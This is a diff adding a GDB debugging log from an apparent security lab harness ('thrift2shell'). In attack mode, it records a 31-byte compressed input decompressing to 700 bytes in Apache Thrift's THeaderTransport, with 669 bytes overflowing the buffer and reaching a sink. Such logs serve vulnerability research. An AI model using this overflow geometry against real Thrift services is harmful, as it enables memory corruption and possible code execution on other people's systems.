@@ -1,0 +1,27 @@
+Breakpoint 1 at 0x187b: file /home/mesh-home/mishe-tauftauf2shell/lab/frontier/thrift2shell/harness/THeaderTransport.cpp.v0.23.0, line 301.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, apache::thrift::transport::THeaderTransport::untransform (this=0x7fffffffdff0, ptr=0x55555556f860 "x\234stB\005Qh\374*'\374\300\206\200<!PM\241\376Q0bA5", sz=700) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/thrift2shell/harness/THeaderTransport.cpp.v0.23.0:301
+warning: 301	/home/mesh-home/mishe-tauftauf2shell/lab/frontier/thrift2shell/harness/THeaderTransport.cpp.v0.23.0: No such file or directory
+#1  0x0000555555555ef5 in main (argc=2, argv=0x7fffffffe228) at driver.cpp:150
+150	    t.untransform(dst, static_cast<uint32_t>(comp.size()));
+$1 = 31
+$2 = 90 'Z'
+$3 = 60 '<'
+#0  apache::thrift::transport::THeaderTransport::untransform (this=0x7fffffffdff0, ptr=0x55555556f860 "x\234stB\005Qh\374*'\374\300\206\200<!PM\241\376Q0bA5", sz=700) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/thrift2shell/harness/THeaderTransport.cpp.v0.23.0:301
+warning: 301	/home/mesh-home/mishe-tauftauf2shell/lab/frontier/thrift2shell/harness/THeaderTransport.cpp.v0.23.0: No such file or directory
+VARIANT=vuln-0e4a47ea MODE=attack COMPRESSED_LEN=31 DECOMPRESSED_LEN=700 DEST_BYTES=31 OVERFLOW_BYTES=669 TBUF_SIZE=1024
+SET_CALLS=1 SET_SIZE=700 SETPTR_IS_RBUF=1 SETPTR_IS_ORIG_TBUF=0
+DST_UNCHANGED=0
+SINK_DIST=48 SINK_BYTE_1=42 SINK_BYTE_8=42 SINK_BYTE_16=3c
+OBS_OFFSET_0=41
+OBS_OFFSET_16=5a
+OBS_OFFSET_32=7a
+OBS_OFFSET_64=3c
+OBS_OFFSET_128=7b
+OBS_OFFSET_256=42
+OBS_OFFSET_699=7b
+TBUF_OBS_0=41
+SINK_TAG=cc TBUF_TAG=dd
+[Inferior 1 (process 486027) exited normally]
